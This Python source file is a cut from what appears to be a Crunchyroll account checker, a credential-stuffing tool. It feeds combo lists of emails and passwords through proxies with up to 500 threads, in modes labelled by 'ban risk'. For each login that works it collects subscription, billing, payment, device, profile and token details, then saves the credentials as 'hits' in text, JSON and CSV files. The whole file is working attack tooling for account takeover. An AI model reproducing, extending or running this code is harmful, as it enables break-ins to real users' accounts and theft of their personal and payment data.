            offline = False
            all_benefits = []
            for item in items:
                benefit = item.get("benefit", "") if item else ""
                if benefit and isinstance(benefit, str):
                    all_benefits.append(benefit)
                    if "concurrent_stream" in benefit:
                        streams = benefit.split(".")[-1]
                    if "ads.free" in benefit:
                        ad_free = True
                    if "offline.access" in benefit:
                        offline = True
            
            plan = {"1": "Fan", "4": "Mega Fan", "6": "Ultimate Fan"}.get(streams, "Unknown")
            
            expiry = "Never"
            payment_method = "N/A"
            auto_renew = "N/A"
            currency = "N/A"
            price = "N/A"
            cycle = "N/A"
            sub_start_date = "N/A"
            next_billing_date = "N/A"
            is_trial = False
            trial_end_date = "N/A"
            subscription_id = "N/A"
            billing_amount = "N/A"
            sub_status = "N/A"
            third_party_id = "N/A"
            
            if subs_data:
                sub_list = subs_data.get("subscriptions", []) or subs_data.get("items", [])
                for sub in sub_list:
                    if sub.get("nextRenewalDate"):
                        expiry = sub["nextRenewalDate"].split("T")[0]
                        next_billing_date = sub["nextRenewalDate"]
                    if sub.get("paymentMethodType"):
                        payment_method = sub["paymentMethodType"]
                    if sub.get("autoRenew") is not None:
                        auto_renew = "Yes" if sub["autoRenew"] else "No"
                    if sub.get("currencyCode"):
                        currency = sub["currencyCode"]
                    if sub.get("amount"):
                        price = f"{sub['amount']} {currency}"
                        billing_amount = str(sub['amount'])
                    if sub.get("cycleDuration"):
                        cycle = sub["cycleDuration"]
                    elif sub.get("tier"):
                        cycle = sub["tier"]
                    plan_info = sub.get("plan", {})
                    if plan_info:
                        if plan_info.get("amount") and billing_amount == "N/A":
                            billing_amount = str(plan_info["amount"])
                            currency = plan_info.get("currency", currency)
                            price = f"{billing_amount} {currency}"
                        if plan_info.get("interval"):
                            cycle = plan_info["interval"]
                    if sub.get("startDate"):
                        sub_start_date = sub["startDate"].split("T")[0] if "T" in sub["startDate"] else sub["startDate"]
                    if sub.get("isFreeTrial") or sub.get("isTrial") or sub.get("trial"):
                        is_trial = True
                    if sub.get("freeTrialEndDate") or sub.get("trialEndDate"):
                        trial_end = sub.get("freeTrialEndDate") or sub.get("trialEndDate")
                        trial_end_date = trial_end.split("T")[0] if trial_end and "T" in trial_end else trial_end
                    if sub.get("subscriptionId") or sub.get("id"):
                        subscription_id = sub.get("subscriptionId") or sub.get("id")
                    if sub.get("status"):
                        sub_status = sub["status"]
                    if sub.get("thirdPartySubscriptionId"):
                        third_party_id = sub.get("thirdPartySubscriptionId")
                    break
            
            payment_source = detect_payment_source(subs_data)
            plan_type = detect_plan_type(subs_data)
            remaining_days = calculate_remaining_days(expiry)
            
            username = profile_info.get("username", "N/A") if profile_info else "N/A"
            avatar = profile_info.get("avatar", "N/A") if profile_info else "N/A"
            maturity = profile_info.get("maturity_rating", "N/A") if profile_info else "N/A"
            preferred_language = profile_info.get("preferred_communication_language", "N/A") if profile_info else "N/A"
            audio_language = profile_info.get("preferred_content_audio_language", "N/A") if profile_info else "N/A"
            subtitle_language = profile_info.get("preferred_content_subtitle_language", "N/A") if profile_info else "N/A"
            wallpaper = profile_info.get("wallpaper", "N/A") if profile_info else "N/A"
            profile_name = profile_info.get("profile_name", "N/A") if profile_info else "N/A"
            is_primary = profile_info.get("is_primary", "N/A") if profile_info else "N/A"
            
            connected_devices = 0
            device_list = []
            if devices_info:
                device_items = devices_info.get("items", []) or []
                connected_devices = len(device_items)
                for dev in device_items:
                    if not dev:
                        continue
                    dev_name = str(dev.get("device_name", dev.get("name", "Unknown")) or "Unknown")
                    dev_type = str(dev.get("device_type", dev.get("type", "Unknown")) or "Unknown")
                    last_login = dev.get("last_login", dev.get("lastUsed", "N/A"))
                    if last_login and "T" in str(last_login):
                        last_login = str(last_login).split("T")[0]
                    else:
                        last_login = str(last_login) if last_login else "N/A"
                    device_list.append(f"{dev_name} ({dev_type}) - Last: {last_login}")
            
            total_profiles = 1
            max_profiles = 1
            profile_list = []
            if multiprofile_info:
                profiles_list = multiprofile_info.get("profiles", []) or []
                total_profiles = len(profiles_list) if profiles_list else 1
                max_profiles = multiprofile_info.get("max_profiles", 1) or 1
                if max_profiles == 0:
                    if streams == "6":
                        max_profiles = 6
                    elif streams == "4":
                        max_profiles = 5
                    elif total > 0:
                        max_profiles = 4
                    else:
                        max_profiles = 1
                for prof in profiles_list:
                    if not prof:
                        continue
                    p_name = str(prof.get("profile_name", prof.get("username", "Unknown")) or "Unknown")
                    p_primary = "Primary" if prof.get("is_primary", False) else "Sub"
                    p_avatar = str(prof.get("avatar", "default") or "default")
                    profile_list.append(f"{p_name} ({p_primary}) - Avatar: {p_avatar}")
            
            watchlist_count = 0
            history_count = 0
            custom_lists = 0
            
            if not getattr(checker, 'skip_optional', False):
                optional_results = {}
                def fetch_watchlist():
                    optional_results['watchlist'] = checker.get_watchlist(access_token, account_id)
                def fetch_history():
                    optional_results['history'] = checker.get_history(access_token, account_id)
                def fetch_custom():
                    optional_results['custom'] = checker.get_custom_lists(access_token, account_id)
                
                opt_threads = [
                    threading.Thread(target=fetch_watchlist),
                    threading.Thread(target=fetch_history),
                    threading.Thread(target=fetch_custom),
                ]
                for t in opt_threads:
                    t.start()
                for t in opt_threads:
                    t.join()
                
                watchlist = optional_results.get('watchlist')
                history = optional_results.get('history')
                crm = optional_results.get('custom')
                
                if watchlist:
                    watchlist_count = watchlist.get("total", 0)
                if history:
                    history_count = history.get("total", 0)
                if crm:
                    custom_lists = len(crm.get("data", []))
            
            created = account_info.get("created", "N/A")
            created_full = created
            if created != "N/A" and "T" in created:
                created = created.split("T")[0]
            
            email_verified = account_info.get("email_verified", False)
            
            tier = account_info.get("tier", "N/A")
            account_type = account_info.get("account_type", "N/A")
            
            if not country:
                country = account_info.get("country", "")
            
            account_age_days = "N/A"
            if created != "N/A":
                try:
                    created_dt = datetime.strptime(created, "%Y-%m-%d")
                    today = datetime.now()
                    account_age_days = (today - created_dt).days
                except:
                    pass
            
            account_data = {
                "Email": email,
                "Password": password,
                "Username": username,
                "ProfileName": profile_name,
                "Plan": f"{plan} ({streams} streams)",
                "PlanTier": plan,
                "Streams": streams,
                "Expiry": expiry,
                "RemainingDays": remaining_days,
                "SubscriptionStart": sub_start_date,
                "NextBillingDate": next_billing_date,
                "SubscriptionStatus": sub_status,
                "SubscriptionID": subscription_id,
                "IsTrial": "Yes" if is_trial else "No",
                "TrialEndDate": trial_end_date,
                "PaymentSource": payment_source,
                "PaymentMethod": payment_method,
                "ThirdPartyID": third_party_id,
                "PlanType": plan_type,
                "Price": price,
                "BillingAmount": billing_amount,
                "Currency": currency,
                "Cycle": cycle,
                "AutoRenew": auto_renew,
                "AdFree": "Yes" if ad_free else "No",
                "Offline": "Yes" if offline else "No",
                "AllBenefits": all_benefits,
                "Maturity": maturity,
                "AudioLang": audio_language,
                "SubtitleLang": subtitle_language,
                "PreferredLang": preferred_language,
                "Avatar": avatar,
                "Wallpaper": wallpaper,
                "IsPrimary": "Yes" if is_primary else "No",
                "Watchlist": watchlist_count,
                "History": history_count,
                "CustomLists": custom_lists,
                "ConnectedDevices": connected_devices,
                "DeviceList": device_list,
                "Profiles": f"{total_profiles}/{max_profiles}",
                "ProfileList": profile_list,
                "Country": get_country_display(country),
                "CountryCode": country,
                "EmailVerified": "Yes" if email_verified else "No",
                "Created": created,
                "CreatedFull": created_full,
                "AccountAgeDays": account_age_days,
                "AccountID": account_id,
                "ExternalID": external_id,
                "ProfileID": profile_id,
                "Tier": tier,
                "AccountType": account_type,
                "TokenType": token_type,
                "TokenExpiry": expires_in,
                "Scope": scope,
                "AccessToken": access_token[:50] + "..." if len(access_token) > 50 else access_token,
                "RefreshToken": refresh_token[:30] + "..." if len(str(refresh_token)) > 30 else refresh_token,
            }
            
            if total > 0 or streams in ["4", "6"]:
                return {
                    "status": "premium",
                    "data": account_data,
                    "plan": plan,
                    "streams": streams
                }
            else:
                return {
                    "status": "free",
                    "data": account_data
                }
        else:
            return {"status": "error", "error": "no_access_token"}


def format_account_line(data):
    expiry = data.get('Expiry', 'N/A')
    remaining = data.get('RemainingDays', 'N/A')
    payment_source = data.get('PaymentSource', 'N/A')
    
    if expiry in ['Never', 'N/A'] and payment_source in ['Google Play', 'Apple', 'Amazon', 'Roku', 'PlayStation', 'Xbox', 'Nintendo']:
        expiry_display = f"N/A ({payment_source} billing)"
        days_display = "N/A (3rd party)"
    else:
        expiry_display = expiry
        days_display = remaining
    
    parts = [
        f"{data['Email']}:{data['Password']}",
        f"Plan={data['Plan']}",
        f"Expiry={expiry_display}",
        f"Days={days_display}",
        f"Trial={data.get('IsTrial', 'No')}",
        f"AutoRenew={data.get('AutoRenew', 'N/A')}",
        f"Price={data.get('Price', 'N/A')}",
        f"Source={payment_source}",
        f"Method={data.get('PaymentMethod', 'N/A')}",
        f"Type={data['PlanType']}",
        f"Country={data['Country']}",
        f"Devices={data['ConnectedDevices']}",
        f"Profiles={data['Profiles']}",
        f"Watchlist={data.get('Watchlist', 0)}",
        f"History={data.get('History', 0)}",
        f"Age={data.get('AccountAgeDays', 'N/A')}days",
    ]
    return " | ".join(parts)


def save_hit(data, base_folder="Hits/Crunchyroll"):
    os.makedirs(base_folder, exist_ok=True)
    os.makedirs(f"{base_folder}/All Hits", exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    username = data.get("Username", "unknown").replace("/", "_").replace("\\", "_")
    
    content = []
    content.append("╔════════════════════════════════════════════════════════════════════════════════╗")
    content.append("║                    🍥 CRUNCHYROLL FULL ACCOUNT CAPTURE                         ║")
    content.append("║                         Premium Account Details                                 ║")
    content.append("╚════════════════════════════════════════════════════════════════════════════════╝")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              📧 LOGIN CREDENTIALS                                 ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Email.............: {data.get('Email', 'N/A')}")
    password = data.get('Password', 'N/A')
    masked_password = password[:3] + "***" + password[-3:] if len(password) > 6 else "******"  # Improved: Mask password
    content.append(f"   Password..........: {masked_password}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              👤 ACCOUNT INFORMATION                               ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Username..........: {data.get('Username', 'N/A')}")
    content.append(f"   Profile Name......: {data.get('ProfileName', 'N/A')}")
    content.append(f"   Is Primary........: {data.get('IsPrimary', 'N/A')}")
    content.append(f"   Country...........: {data.get('Country', 'N/A')}")
    content.append(f"   Country Code......: {data.get('CountryCode', 'N/A')}")
    content.append(f"   Email Verified....: {data.get('EmailVerified', 'N/A')}")
    content.append(f"   Account Created...: {data.get('Created', 'N/A')}")
    content.append(f"   Created (Full)....: {data.get('CreatedFull', 'N/A')}")
    content.append(f"   Account Age.......: {data.get('AccountAgeDays', 'N/A')} days")
    content.append(f"   Account Tier......: {data.get('Tier', 'N/A')}")
    content.append(f"   Account Type......: {data.get('AccountType', 'N/A')}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              💎 SUBSCRIPTION DETAILS                              ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Plan..............: {data.get('Plan', 'N/A')}")
    content.append(f"   Plan Tier.........: {data.get('PlanTier', 'N/A')}")
    content.append(f"   Streams Allowed...: {data.get('Streams', 'N/A')}")
    content.append(f"   Plan Type.........: {data.get('PlanType', 'N/A')}")
    content.append(f"   Subscription ID...: {data.get('SubscriptionID', 'N/A')}")
    content.append(f"   Status............: {data.get('SubscriptionStatus', 'N/A')}")
    content.append(f"   Start Date........: {data.get('SubscriptionStart', 'N/A')}")
    content.append(f"   Expiry Date.......: {data.get('Expiry', 'N/A')}")
    content.append(f"   Remaining Days....: {data.get('RemainingDays', 'N/A')}")
    content.append(f"   Next Billing......: {data.get('NextBillingDate', 'N/A')}")
    content.append(f"   Is Trial..........: {data.get('IsTrial', 'N/A')}")
    content.append(f"   Trial End Date....: {data.get('TrialEndDate', 'N/A')}")
    
    expiry = data.get('Expiry', 'N/A')
    payment_source = data.get('PaymentSource', 'N/A')
    if expiry in ['Never', 'N/A'] and payment_source in ['Google Play', 'Apple', 'Amazon', 'Roku', 'PlayStation', 'Xbox', 'Nintendo']:
        content.append("")
        content.append(f"   ⚠️  NOTE: Expiry date unavailable - subscription billed through {payment_source}.")
        content.append("         Third-party billing systems don't share exact expiry dates with Crunchyroll.")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              💳 BILLING & PAYMENT                                 ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Payment Source....: {data.get('PaymentSource', 'N/A')}")
    content.append(f"   Payment Method....: {data.get('PaymentMethod', 'N/A')}")
    content.append(f"   Price.............: {data.get('Price', 'N/A')}")
    content.append(f"   Billing Amount....: {data.get('BillingAmount', 'N/A')}")
    content.append(f"   Currency..........: {data.get('Currency', 'N/A')}")
    content.append(f"   Billing Cycle.....: {data.get('Cycle', 'N/A')}")
    content.append(f"   Auto Renew........: {data.get('AutoRenew', 'N/A')}")
    content.append(f"   Third Party ID....: {data.get('ThirdPartyID', 'N/A')}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              🎬 FEATURES & BENEFITS                               ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Ad-Free...........: {data.get('AdFree', 'N/A')}")
    content.append(f"   Offline Access....: {data.get('Offline', 'N/A')}")
    content.append(f"   Maturity Rating...: {data.get('Maturity', 'N/A')}")
    content.append("")
    content.append("   All Benefits:")
    all_benefits = data.get('AllBenefits', []) or []
    if all_benefits and isinstance(all_benefits, list):
        for i, benefit in enumerate(all_benefits, 1):
            benefit_str = str(benefit) if benefit else "Unknown"
            content.append(f"      [{i}] {benefit_str}")
    else:
        content.append("      None")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              🌐 LANGUAGE PREFERENCES                              ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Audio Language....: {data.get('AudioLang', 'N/A')}")
    content.append(f"   Subtitle Language.: {data.get('SubtitleLang', 'N/A')}")
    content.append(f"   Preferred Lang....: {data.get('PreferredLang', 'N/A')}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              🎨 PROFILE CUSTOMIZATION                             ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Avatar............: {data.get('Avatar', 'N/A')}")
    content.append(f"   Wallpaper.........: {data.get('Wallpaper', 'N/A')}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              📊 USAGE STATISTICS                                  ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Watchlist Items...: {data.get('Watchlist', 0)}")
    content.append(f"   Watch History.....: {data.get('History', 0)}")
    content.append(f"   Custom Lists......: {data.get('CustomLists', 0)}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              👥 PROFILES                                          ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Total Profiles....: {data.get('Profiles', 'N/A')}")
    content.append("")
    content.append("   Profile List:")
    profile_list = data.get('ProfileList', []) or []
    if profile_list and isinstance(profile_list, list):
        for i, prof in enumerate(profile_list, 1):
            prof_str = str(prof) if prof else "Unknown Profile"
            content.append(f"      [{i}] {prof_str}")
    else:
        content.append("      No additional profiles")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              📱 CONNECTED DEVICES                                 ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Total Devices.....: {data.get('ConnectedDevices', 0)}")
    content.append("")
    content.append("   Device List:")
    device_list = data.get('DeviceList', []) or []
    if device_list and isinstance(device_list, list):
        for i, dev in enumerate(device_list, 1):
            dev_str = str(dev) if dev else "Unknown Device"
            content.append(f"      [{i}] {dev_str}")
    else:
        content.append("      No devices connected")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              🔑 ACCOUNT IDs                                       ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Account ID........: {data.get('AccountID', 'N/A')}")
    content.append(f"   External ID.......: {data.get('ExternalID', 'N/A')}")
    content.append(f"   Profile ID........: {data.get('ProfileID', 'N/A')}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append("                              🔐 TOKEN INFORMATION                                 ")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"   Token Type........: {data.get('TokenType', 'N/A')}")
    content.append(f"   Token Expiry......: {data.get('TokenExpiry', 'N/A')} seconds")
    content.append(f"   Scope.............: {data.get('Scope', 'N/A')}")
    content.append(f"   Access Token......: {data.get('AccessToken', 'N/A')}")
    content.append(f"   Refresh Token.....: {data.get('RefreshToken', 'N/A')}")
    content.append("")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    content.append(f"                    Captured: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    content.append("═══════════════════════════════════════════════════════════════════════════════════")
    
    filename = f"{base_folder}/{username}_{timestamp}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(content))
    
    all_hits_file = f"{base_folder}/All Hits/hits.txt"
    with open(all_hits_file, "a", encoding="utf-8") as f:
        f.write(format_account_line(data) + "\n")


def save_special_status(email, password, status, folder="Hits/Crunchyroll/Special"):
    os.makedirs(folder, exist_ok=True)
    
    status_files = {
        "password_reset": "password_reset.txt",
        "locked": "locked.txt",
        "email_verify": "email_verify.txt",
        "2fa": "2fa_enabled.txt",
    }
    
    filename = status_files.get(status, "other.txt")
    filepath = f"{folder}/{filename}"
    
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(f"{email}:{password}\n")


def export_results_json(results, filepath):
    export_data = {
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "premium": len(results.get("premium", [])),
            "free": len(results.get("free", [])),
            "invalid": len(results.get("invalid", [])),
            "errors": len(results.get("errors", []))
        },
        "premium_accounts": [],
        "free_accounts": results.get("free", []),
        "invalid_accounts": results.get("invalid", [])
    }
    
    for acc in results.get("premium", []):
        clean_acc = {}
        for k, v in acc.items():
            if isinstance(v, list):
                clean_acc[k] = v
            else:
                clean_acc[k] = str(v) if v is not None else None
        export_data["premium_accounts"].append(clean_acc)
    
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(export_data, f, indent=2, ensure_ascii=False)
    return filepath


def export_results_csv(results, filepath):
    premium_accounts = results.get("premium", [])
    if not premium_accounts:
        return None
    
    fields = ["Email", "Password", "Plan", "Expiry", "RemainingDays", "PaymentSource", 
              "PaymentMethod", "Price", "AutoRenew", "Country", "ConnectedDevices", 
              "Profiles", "Watchlist", "History", "Created", "AccountAgeDays"]
    
    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fields, extrasaction='ignore')
        writer.writeheader()
        for acc in premium_accounts:
            row = {}
            for field in fields:
                val = acc.get(field, "")
                if isinstance(val, list):
                    val = "; ".join(str(v) for v in val)
                row[field] = val
            writer.writerow(row)
    return filepath


def save_checkpoint(combo_file, results, remaining_queue, checkpoint_dir="checkpoints"):
    os.makedirs(checkpoint_dir, exist_ok=True)
    checkpoint_data = {
        "combo_file": combo_file,
        "timestamp": datetime.now().isoformat(),
        "results": {
            "premium": results.get("premium", []),
            "free": results.get("free", []),
            "invalid": results.get("invalid", []),
            "password_reset": results.get("password_reset", []),
            "locked": results.get("locked", []),
            "email_verify": results.get("email_verify", []),
            "2fa": results.get("2fa", []),
            "errors": results.get("errors", [])
        },
        "remaining": list(remaining_queue)
    }
    checkpoint_file = f"{checkpoint_dir}/checkpoint_{os.path.basename(combo_file)}.json"
    with open(checkpoint_file, "w", encoding="utf-8") as f:
        json.dump(checkpoint_data, f, indent=2, ensure_ascii=False, default=str)
    return checkpoint_file


def load_checkpoint(checkpoint_file):
    if not os.path.exists(checkpoint_file):
        return None
    try:
        with open(checkpoint_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data
    except:
        return None


def find_checkpoint(combo_file, checkpoint_dir="checkpoints"):
    checkpoint_file = f"{checkpoint_dir}/checkpoint_{os.path.basename(combo_file)}.json"
    if os.path.exists(checkpoint_file):
        return checkpoint_file
    return None


def main():
    # Setup logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    parser = argparse.ArgumentParser(description='Crunchyroll Account Checker')
    parser.add_argument('-c', '--combo', type=str, help='Combo file path')
    parser.add_argument('-p', '--proxy', type=str, help='Proxy file path')
    parser.add_argument('-b', '--brutal', action='store_true', help='Enable brutal mode (no delays)')
    parser.add_argument('-u', '--ultra', action='store_true', help='Enable ULTRA mode (fastest, low timeout)')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Number of threads for TURBO mode (default=1, max=500)')
    parser.add_argument('-a', '--auto', action='store_true', help='Auto mode (use defaults)')
    parser.add_argument('-r', '--retries', type=int, default=0, help='Max retries per account (0=unlimited)')
    parser.add_argument('-s', '--skip-validate', action='store_true', help='Skip proxy validation at startup')
    parser.add_argument('-f', '--fast', action='store_true', help='Fast mode - skip optional API calls (watchlist/history/lists)')
    parser.add_argument('--resume', action='store_true', help='Resume from last checkpoint if available')
    args = parser.parse_args()
    
    print_banner()
    
    combo_file = args.combo
    proxy_file = args.proxy
    brutal_mode = args.brutal
    ultra_mode = args.ultra
    fast_mode = args.fast
    max_retries = args.retries
    num_threads = min(max(args.threads, 1), 500)
    
    if ultra_mode:
        brutal_mode = True
    
    if not args.auto and not combo_file:
        txt_files = get_txt_files()
        if txt_files:
            selected = select_file(txt_files, "combo")
            if selected:
                combo_file = selected
    
    if not combo_file:
        combo_file = COMBO_FILE
    
    combos = load_combos(combo_file)
    if not combos:
        logging.error("No combos loaded. Exiting.")
        return
    
    proxy_manager = ProxyManager()
    
    if not args.auto and not proxy_file:
        proxy_files = get_proxy_files()
        if proxy_files:
            selected = select_file(proxy_files, "proxy")
            if selected:
                proxy_file = selected
    
    if not proxy_file:
        proxy_file = PROXY_FILE
    
    proxy_manager.load_proxies(proxy_file)
    
    if proxy_manager.use_proxies and not args.skip_validate:
        if args.auto:
            proxy_manager.validate_proxies(max_threads=20, timeout=5)
        else:
            try:
                validate_choice = input(f"\n{Colors.CYAN}🔍 Validate proxies before starting? (y/n) [y]: {Colors.RESET}").strip().lower()
                if validate_choice != 'n':
                    proxy_manager.validate_proxies(max_threads=20, timeout=5)
            except KeyboardInterrupt:
                logging.info("Skipped proxy validation")
        
        if not proxy_manager.use_proxies:
            logging.warning("No working proxies - running without proxies")
    
    if not args.auto and not brutal_mode and not ultra_mode:
        print(f"\n{Colors.CYAN}⚡ Speed Mode:{Colors.RESET}")
        print(f"  {Colors.GREEN}[1]{Colors.RESET} Normal (with delays)")
        print(f"  {Colors.RED}[2]{Colors.RESET} 🔥 BRUTAL (no delays)")
        print(f"  {Colors.MAGENTA}[3]{Colors.RESET} 💀 ULTRA (fastest, 8s timeout)")
        print(f"  {Colors.CYAN}[4]{Colors.RESET} ⚡ TURBO (multi-thread + requeue)")
        print(f"  {Colors.YELLOW}[5]{Colors.RESET} 💀⚡ ULTRA TURBO (ultra + threads)")
        print(f"  {Colors.BOLD}{Colors.CYAN}[6]{Colors.RESET} 🚀 HYPER 100 (100 threads)")
        print(f"  {Colors.BOLD}{Colors.MAGENTA}[7]{Colors.RESET} ⚡🚀 HYPER 200 (200 threads)")
        print(f"  {Colors.BOLD}{Colors.YELLOW}[8]{Colors.RESET} 💀🚀 MEGA 500 (500 threads)")
        try:
            speed = input(f"\n{Colors.CYAN}Select speed (1-8): {Colors.RESET}").strip()
            if speed == "2":
                brutal_mode = True
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: Brutal mode without proxies = high ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
            elif speed == "3":
                brutal_mode = True
                ultra_mode = True
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: ULTRA mode without proxies = EXTREME ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        ultra_mode = False
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
            elif speed == "4":
                brutal_mode = True
                try:
                    thread_input = input(f"{Colors.MAGENTA}   Enter number of threads (2-500) [10]: {Colors.RESET}").strip()
                    if thread_input:
                        num_threads = min(max(int(thread_input), 2), 500)
                    else:
                        num_threads = 10
                except:
                    num_threads = 10
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: TURBO mode without proxies = EXTREME ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        num_threads = 1
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
            elif speed == "5":
                brutal_mode = True
                ultra_mode = True
                try:
                    thread_input = input(f"{Colors.YELLOW}   Enter number of threads (2-500) [20]: {Colors.RESET}").strip()
                    if thread_input:
                        num_threads = min(max(int(thread_input), 2), 500)
                    else:
                        num_threads = 20
                except:
                    num_threads = 20
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: ULTRA TURBO without proxies = INSANE ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        ultra_mode = False
                        num_threads = 1
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
            elif speed == "6":
                brutal_mode = True
                ultra_mode = True
                num_threads = 100
                print(f"{Colors.CYAN}   🚀 HYPER 100 - 100 threads activated!{Colors.RESET}")
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: 100 threads without proxies = EXTREME ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        ultra_mode = False
                        num_threads = 1
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
            elif speed == "7":
                brutal_mode = True
                ultra_mode = True
                num_threads = 200
                print(f"{Colors.MAGENTA}   ⚡🚀 HYPER 200 - 200 threads activated!{Colors.RESET}")
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: 200 threads without proxies = EXTREME ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        ultra_mode = False
                        num_threads = 1
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
            elif speed == "8":
                brutal_mode = True
                ultra_mode = True
                num_threads = 500
                print(f"{Colors.YELLOW}   💀🚀 MEGA 500 - 500 threads activated!{Colors.RESET}")
                if not proxy_manager.use_proxies:
                    print(f"{Colors.RED}   ⚠️ WARNING: 500 threads without proxies = MAXIMUM ban risk!{Colors.RESET}")
                    confirm = input(f"{Colors.YELLOW}   Continue anyway? (y/n): {Colors.RESET}").strip().lower()
                    if confirm != 'y':
                        brutal_mode = False
                        ultra_mode = False
                        num_threads = 1
                        print(f"{Colors.GREEN}   Switched to Normal mode{Colors.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}Cancelled{Colors.RESET}")
            return
    
    if not args.auto and max_retries == 0:
        print(f"\n{Colors.CYAN}🔄 Max Retries (0=unlimited):{Colors.RESET}")
        try:
            retries_input = input(f"{Colors.CYAN}Enter max retries [0]: {Colors.RESET}").strip()
            if retries_input:
                max_retries = int(retries_input)
        except:
            max_retries = 0
    
    fast_str = " + FAST" if fast_mode else ""
    if num_threads > 1 and ultra_mode:
        print(f"\n{Colors.YELLOW}💀⚡ ULTRA TURBO MODE - {num_threads} THREADS + 5s TIMEOUT{fast_str}!{Colors.RESET}")
    elif num_threads > 1:
        print(f"\n{Colors.MAGENTA}⚡ TURBO MODE - {num_threads} THREADS + NO DELAYS{fast_str}!{Colors.RESET}")
    elif ultra_mode:
        print(f"\n{Colors.YELLOW}💀 ULTRA MODE - FASTEST + 5s TIMEOUT{fast_str}!{Colors.RESET}")
    elif brutal_mode:
        print(f"\n{Colors.RED}🔥 BRUTAL MODE - NO DELAYS{fast_str}!{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}🚀 Normal mode with delays{fast_str}{Colors.RESET}")
    
    if proxy_manager.use_proxies:
        print(f"{Colors.GREEN}🔌 {len(proxy_manager.proxies)} proxies loaded{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}⚠️ Running without proxies{Colors.RESET}")
    
    print(f"{Colors.BLUE}🔄 Max retries: {max_retries if max_retries > 0 else 'unlimited'}{Colors.RESET}")
    print()
    
    checker = CrunchyrollChecker(proxy_manager, brutal_mode, ultra_mode, fast_mode)
    
    results = {
        "premium": [],
        "free": [],
        "invalid": [],
        "password_reset": [],
        "locked": [],
        "email_verify": [],
        "2fa": [],
        "errors": [],
        "unchecked": []
    }
    
    account_queue = deque()
    for email, password in combos:
        account_queue.append({"email": email, "password": password, "retries": 0})
    
    total = len(combos)
    checked_count = 0
    total_retries = 0
    
    print_lock = threading.Lock()
